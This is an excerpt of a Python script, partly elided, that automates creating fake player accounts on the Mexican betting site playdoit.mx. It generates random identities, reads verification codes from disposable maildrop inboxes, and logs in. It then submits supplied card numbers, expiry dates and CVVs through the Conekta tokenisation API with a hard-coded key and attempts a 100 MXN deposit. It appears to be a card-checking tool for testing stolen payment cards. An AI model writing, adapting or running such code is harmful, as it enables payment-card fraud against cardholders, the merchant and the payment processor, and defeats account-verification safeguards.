...
_pw  = lambda: (''.join(random.choices(string.ascii_letters, k=5))
                + ''.join(random.choices(string.digits, k=3))
                + '.'
                + ''.join(random.choices(string.ascii_lowercase, k=5)))
_un  = lambda: _f.user_name()
_tel = lambda: str(random.randint(1000000000, 9999999999))
_nm  = lambda: (f"{_f.first_name().replace('+','').replace('.','')}"
                f"+{_f.last_name().replace('+','').replace('.','')}")
...
_HDR = {
    'Host': 'www.playdoit.mx', 'Connection': 'keep-alive',
    'sec-ch-ua-platform': '"Android"', 'User-Agent': _UA,
    'Accept': 'application/json',
    'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile': '?1', 'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.8',
    'Origin': 'https://www.playdoit.mx', 'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://www.playdoit.mx/?modal=registration',
}


_MAILDROP_DOMAIN = 'mailtothis.com'
_MAILDROP_API    = 'https://api.maildrop.cc/graphql'
_MAILDROP_DOMAINS = ('maildrop.cc', 'bccmail.one', 'mailtothis.com',
                     'dumpmail.de', 'gcxmail.one', 'crabmail.com')
...
def _get_code(email, sess):
    ...
    for m in msgs:
        ...
        mm = re.search(r'(?:\bC[oó]digo\b|\bverificaci[oó]n\b|:\s*)\s*[<]?\s*(\d{4,6})', text, re.IGNORECASE)
        if mm:
            return mm.group(1)
    return None
...
def _create_account(sess):
    ...
    pw   = _pw()
    data = (f"email={addr}&phoneNumber=+52{_tel()}&password={pw}&confirmPassword={pw}"
            f"&nickName={_un()}&birthDate={_bd()}&{_usr()}&gender=Male&country=MEX"
            f"&birthState=Chiapas&city=Buenos+Aires&address=Mana&houseNumber=183"
            f"&zipCode=20020&district=Buekso&campaignsEnabled=false&receiveEmail=false"
            f"&receiveSms=false&privacyPolicyChecked=true&agentCode=&currency=MXN"
            f"&campaignId=15511&policyChecked=true&ageChecked=true&language=es"
            f"&siteHost=www.playdoit.mx&device={_dv()}")
    res = sess.post('https://www.playdoit.mx/api/player/registerPlayer',
                    headers=_HDR, data=data, timeout=20)
    try:
        resj = res.json()
    except Exception:
        resj = {}
    ...
    login_data = (f"customerApp=&login={addr}&password={pw}&badCredentials=false"
                  f"&loginCoolOffExpireTime=0&nextCoolOffActive=false"
                  f"&resetPasswordRequired=false&siteHost=www.playdoit.mx"
                  f"&coolOffActive=false&loginCoolOffEnabled=false")
    r_login = sess.post('https://www.playdoit.mx/api/login', headers=_HDR, data=login_data, timeout=20)
    sess.get('https://www.playdoit.mx/api/player/sendVerificationEmail', headers=_HDR,
             cookies=r_login.cookies, timeout=15)
    ...
    sess.post('https://www.playdoit.mx/api/player/verifyEmailShortCode',
              headers=_HDR, data=f'code={code}', cookies=r_login.cookies, timeout=15)
    return addr, pw
...
def _flow(num, mes, ano, cvv, proxy=None):
    ...
    for _ in range(2):
        try:
            ...
            if not addr:
                last = 'Account creation failed'; continue

            login_data = (f"customerApp=&login={addr}&password={pw}&badCredentials=false"
                          f"&loginCoolOffExpireTime=0&nextCoolOffActive=false"
                          f"&resetPasswordRequired=false&siteHost=www.playdoit.mx"
                          f"&loginCoolOffEnabled=false&coolOffActive=false")
            ...
            try:
                ...
                rp_ok = False
            if not rp_ok:
                last = 'Login failed'; continue

            tok_data = (f"card[number]={num}&card[name]={_nm()}&card[cvc]={cvv}"
                        f"&card[exp_month]={mes}&card[exp_year]={ano}&card[device_fingerprint]={_uc()}")
            r2    = sess.post('https://api.conekta.io/tokens',
                              headers={'Accept': 'application/vnd.conekta-v0.3.0+json',
                                       'Accept-Language': 'es',
                                       'Conekta-Client-User-Agent': '{"agent": "Conekta Android SDK"}',
                                       'Authorization': 'Basic a2V5X2RaZ1p4eXh3U1o2UFJycngzdnRFY3Jn',
                                       'Content-Type': 'application/x-www-form-urlencoded',
                                       'Host': 'api.conekta.io', 'Connection': 'Keep-Alive',
                                       'User-Agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)'},
                              data=tok_data, timeout=20)
            token = ''
            ...
            charge = (f"customerApp=&method=400003&amount=100&password="
                      f"&conekta_token_id={token}&siteHost=www.playdoit.mx")
            r3 = sess.post('https://www.playdoit.mx/api/payment/confirmDeposit',
                           headers=_HDR, data=charge, timeout=20)
